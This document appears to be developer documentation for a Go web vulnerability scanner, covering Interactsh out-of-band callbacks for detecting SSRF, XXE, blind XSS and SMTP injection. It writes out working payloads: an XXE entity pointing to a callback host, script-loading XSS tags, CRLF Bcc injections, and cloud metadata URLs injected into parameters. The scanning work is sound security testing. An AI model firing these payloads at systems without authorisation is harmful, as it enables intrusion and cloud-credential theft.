# Out-of-Band (OOB) Detection

**Interactsh integration and callback handling for blind vulnerabilities.**

## Interactsh Integration

### Client Initialization

```go
import (
    "github.com/projectdiscovery/interactsh/pkg/client"
    "github.com/projectdiscovery/interactsh/pkg/server"
)

type OOBDetector struct {
    client *client.Client
}

func NewOOBDetector(serverURL string) (*OOBDetector, error) {
    opts := client.DefaultOptions()

    // Use custom server or public instance
    if serverURL != "" {
        opts.ServerURL = serverURL
    } else {
        opts.ServerURL = "oast.pro" // Public Interactsh server
    }

    interactshClient, err := client.New(opts)
    if err != nil {
        return nil, fmt.Errorf("failed to create interactsh client: %w", err)
    }

    return &OOBDetector{client: interactshClient}, nil
}

func (d *OOBDetector) Close() {
    if d.client != nil {
        d.client.Close()
    }
}
```

### Generating Callback URLs

```go
type CallbackTracker struct {
    parameterToURL map[string]string // Track which URL belongs to which param
    urlToParameter map[string]string // Reverse lookup
}

func (d *OOBDetector) GenerateCallbacks(parameters []string) *CallbackTracker {
    tracker := &CallbackTracker{
        parameterToURL: make(map[string]string),
        urlToParameter: make(map[string]string),
    }

    for _, param := range parameters {
        callbackURL := d.client.URL()
        tracker.parameterToURL[param] = callbackURL
        tracker.urlToParameter[callbackURL] = param
    }

    return tracker
}
```

### Collecting Interactions

```go
func (d *OOBDetector) CollectInteractions(tracker *CallbackTracker, waitTime time.Duration) []Finding {
    // Wait for interactions
    time.Sleep(waitTime)

    // Retrieve all interactions
    interactions := d.client.GetInteractions()

    var findings []Finding
    for _, interaction := range interactions {
        // Match interaction back to parameter
        for callbackURL, param := range tracker.urlToParameter {
            if d.matchesCallback(interaction, callbackURL) {
                findings = append(findings, Finding{
                    Type:       d.classifyInteraction(interaction),
                    Severity:   Critical,
                    Confidence: 0.95,
                    Parameter:  param,
                    Evidence:   d.formatEvidence(interaction),
                })
            }
        }
    }

    return findings
}

func (d *OOBDetector) matchesCallback(interaction *client.Interaction, callbackURL string) bool {
    // Extract unique ID from callback URL
    uniqueID := extractUniqueID(callbackURL)
    return strings.Contains(interaction.UniqueID, uniqueID)
}

func extractUniqueID(url string) string {
    // Extract subdomain from URL: http://abc123.oast.pro -> abc123
    parts := strings.Split(url, ".")
    if len(parts) > 0 {
        subdomain := strings.TrimPrefix(parts[0], "http://")
        subdomain = strings.TrimPrefix(subdomain, "https://")
        return subdomain
    }
    return ""
}
```

### Classifying Interactions

```go
func (d *OOBDetector) classifyInteraction(interaction *client.Interaction) string {
    switch interaction.Protocol {
    case "dns":
        return "DNS-Based-Vulnerability"
    case "http":
        return "SSRF"
    case "smtp":
        return "SMTP-Injection"
    case "ldap":
        return "LDAP-Injection"
    default:
        return "OOB-Vulnerability"
    }
}

func (d *OOBDetector) formatEvidence(interaction *client.Interaction) string {
    return fmt.Sprintf(
        "OOB callback received via %s protocol. "+
        "Timestamp: %s, UniqueID: %s, RemoteAddress: %s",
        interaction.Protocol,
        interaction.Timestamp,
        interaction.UniqueID,
        interaction.RemoteAddress,
    )
}
```

## SSRF with OOB

### Complete SSRF Detection

```go
type SSRFPlugin struct {
    oobDetector *OOBDetector
}

func (p *SSRFPlugin) Detect(ctx context.Context, target *Target, resp *Response) ([]Finding, error) {
    if p.oobDetector == nil {
        return nil, fmt.Errorf("OOB detector not initialized")
    }

    // Generate unique callback URLs for each parameter
    paramNames := getParameterNames(target)
    tracker := p.oobDetector.GenerateCallbacks(paramNames)

    // Inject callbacks into each parameter
    for param, callbackURL := range tracker.parameterToURL {
        modifiedParams := copyParams(target.Parameters)
        modifiedParams[param] = callbackURL

        // Make request with callback URL
        _, err := makeRequest(ctx, target, modifiedParams)
        if err != nil {
            continue // Log but continue with other parameters
        }
    }

    // Wait and collect interactions
    findings := p.oobDetector.CollectInteractions(tracker, 5*time.Second)

    // Enhance findings with SSRF-specific details
    for i := range findings {
        findings[i].Type = "SSRF"
        findings[i].Remediation = "Validate and sanitize all user-supplied URLs. Implement allowlist for permitted domains."
        findings[i].CWE = "CWE-918"
    }

    return findings, nil
}
```

### Cloud Metadata SSRF

```go
func (p *SSRFPlugin) detectCloudMetadata(ctx context.Context, target *Target) ([]Finding, error) {
    metadataEndpoints := []string{
        "http://169.254.169.254/latest/meta-data/",  // AWS
        "http://metadata.google.internal/computeMetadata/v1/", // GCP
        "http://169.254.169.254/metadata/instance", // Azure
    }

    var findings []Finding
    for _, endpoint := range metadataEndpoints {
        for param := range target.Parameters {
            modifiedParams := copyParams(target.Parameters)
            modifiedParams[param] = endpoint

            resp, err := makeRequest(ctx, target, modifiedParams)
            if err != nil {
                continue
            }

            // Check for cloud metadata response patterns
            if detectsCloudMetadata(resp) {
                findings = append(findings, Finding{
                    Type:       "SSRF-Cloud-Metadata",
                    Severity:   Critical,
                    Confidence: 0.9,
                    Parameter:  param,
                    Evidence:   "Cloud metadata endpoint accessible",
                })
            }
        }
    }
    return findings, nil
}
```

## XXE with OOB

### External Entity Injection

```go
type XXEPlugin struct {
    oobDetector *OOBDetector
}

func (p *XXEPlugin) Detect(ctx context.Context, target *Target, resp *Response) ([]Finding, error) {
    if p.oobDetector == nil {
        return nil, fmt.Errorf("OOB detector not initialized")
    }

    // Generate callback URL
    callbackURL := p.oobDetector.client.URL()

    // Craft XXE payload with callback
    payload := fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY %% xxe SYSTEM "http://%s">
%%xxe;
]>
<root></root>`, callbackURL)

    // Inject XXE payload
    modifiedTarget := *target
    modifiedTarget.Body = payload
    modifiedTarget.Headers["Content-Type"] = "application/xml"

    _, err := makeRequest(ctx, &modifiedTarget, target.Parameters)
    if err != nil {
        return nil, err
    }

    // Wait for interaction
    time.Sleep(5 * time.Second)

    // Check for callbacks
    interactions := p.oobDetector.client.GetInteractions()
    if len(interactions) > 0 {
        return []Finding{{
            Type:        "XXE",
            Severity:    Critical,
            Confidence:  0.95,
            Evidence:    fmt.Sprintf("XXE OOB callback received: %s", interactions[0].Protocol),
            Remediation: "Disable external entity processing in XML parser",
            CWE:         "CWE-611",
        }}, nil
    }

    return nil, nil
}
```

## Blind XSS with OOB

### Stored XSS with Callback

```go
type BlindXSSPlugin struct {
    oobDetector *OOBDetector
}

func (p *BlindXSSPlugin) Payloads() []Payload {
    callbackURL := p.oobDetector.client.URL()

    return []Payload{
        {
            Input: fmt.Sprintf(`<script src="http://%s/xss.js"></script>`, callbackURL),
        },
        {
            Input: fmt.Sprintf(`<img src="http://%s/xss.png">`, callbackURL),
        },
        {
            Input: fmt.Sprintf(`<iframe src="http://%s"></iframe>`, callbackURL),
        },
    }
}

func (p *BlindXSSPlugin) Detect(ctx context.Context, target *Target, resp *Response) ([]Finding, error) {
    // Submit payloads
    for _, payload := range p.Payloads() {
        submitPayload(ctx, target, payload.Input)
    }

    // Wait for admin/user to view stored content
    time.Sleep(30 * time.Second) // Longer wait for stored XSS

    // Check for callbacks
    interactions := p.oobDetector.client.GetInteractions()
    if len(interactions) > 0 {
        return []Finding{{
            Type:       "XSS-Blind",
            Severity:   Critical,
            Confidence: 0.9,
            Evidence:   "Blind XSS callback received",
        }}, nil
    }

    return nil, nil
}
```

## SMTP Injection with OOB

```go
type SMTPInjectionPlugin struct {
    oobDetector *OOBDetector
}

func (p *SMTPInjectionPlugin) Payloads() []Payload {
    callbackURL := p.oobDetector.client.URL()

    return []Payload{
        {Input: fmt.Sprintf("%%0d%%0aBcc: test@%s", callbackURL)},
        {Input: fmt.Sprintf("\r\nBcc: test@%s", callbackURL)},
    }
}
```

## Best Practices

### 1. Connection Pooling

```go
// Reuse single Interactsh client across plugins
type PluginManager struct {
    oobDetector *OOBDetector
    plugins     []DetectionPlugin
}

func (m *PluginManager) Initialize() error {
    oobDetector, err := NewOOBDetector("")
    if err != nil {
        return err
    }
    m.oobDetector = oobDetector

    // Initialize plugins with shared OOB detector
    for _, plugin := range m.plugins {
        if oobPlugin, ok := plugin.(OOBCapablePlugin); ok {
            oobPlugin.SetOOBDetector(m.oobDetector)
        }
    }

    return nil
}

func (m *PluginManager) Close() {
    if m.oobDetector != nil {
        m.oobDetector.Close()
    }
}
```

### 2. Timeout Configuration

```go
const (
    DefaultOOBWaitTime = 5 * time.Second
    BlindXSSWaitTime   = 30 * time.Second
    XXEWaitTime        = 10 * time.Second
)

func (d *OOBDetector) CollectWithTimeout(tracker *CallbackTracker, timeout time.Duration) []Finding {
    // Use context for timeout
    ctx, cancel := context.WithTimeout(context.Background(), timeout)
    defer cancel()

    done := make(chan []Finding)
    go func() {
        findings := d.CollectInteractions(tracker, timeout)
        done <- findings
    }()

    select {
    case findings := <-done:
        return findings
    case <-ctx.Done():
        return nil // Timeout
    }
}
```

### 3. Self-Hosted Interactsh

```go
func NewSelfHostedOOBDetector(serverURL string, token string) (*OOBDetector, error) {
    opts := client.DefaultOptions()
    opts.ServerURL = serverURL
    opts.Token = token // Authentication token for private server

    client, err := client.New(opts)
    if err != nil {
        return nil, err
    }

    return &OOBDetector{client: client}, nil
}
```

## Anti-Patterns

❌ **Creating new client per request** - High overhead, rate limiting

❌ **Short wait times** - May miss delayed callbacks (especially blind XSS)

❌ **No callback tracking** - Can't attribute interactions to parameters

❌ **Ignoring interaction types** - Protocol reveals vulnerability type

❌ **Public server for sensitive tests** - Use self-hosted for production

✅ **Reuse single client** - Connection pooling across plugins

✅ **Adaptive wait times** - Longer for stored/blind vulnerabilities

✅ **Track parameter-to-URL mapping** - Accurate attribution

✅ **Classify by protocol** - DNS, HTTP, SMTP indicate different vulns

✅ **Self-host for sensitive scans** - Control and privacy
